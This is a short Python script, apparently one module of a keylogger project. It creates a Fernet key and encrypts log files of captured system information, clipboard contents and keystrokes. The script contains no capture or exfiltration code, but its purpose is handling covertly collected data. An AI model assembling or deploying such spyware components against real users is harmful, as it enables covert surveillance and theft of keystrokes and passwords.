from cryptography.fernet import Fernet
import os

# Encryption key file
key_file = "logs/encryption_key.key"

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)


# Generate and store encryption key (Run once)
def generate_key():
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)


if not os.path.exists(key_file):
    generate_key()


# Load encryption key
def load_key():
    return open(key_file, "rb").read()


key = load_key()
cipher = Fernet(key)


def encrypt_file(file_path, encrypted_file_path):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)

    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)


# File paths
system_information = "logs/system.txt"
clipboard_information = "logs/clipboard.txt"
keys_information = "logs/key_log.txt"

system_information_e = "logs/e_system.txt"
clipboard_information_e = "logs/e_clipboard.txt"
keys_information_e = "logs/e_keys_logged.txt"

# Encrypt files
encrypt_file(system_information, system_information_e)
encrypt_file(clipboard_information, clipboard_information_e)
encrypt_file(keys_information, keys_information_e)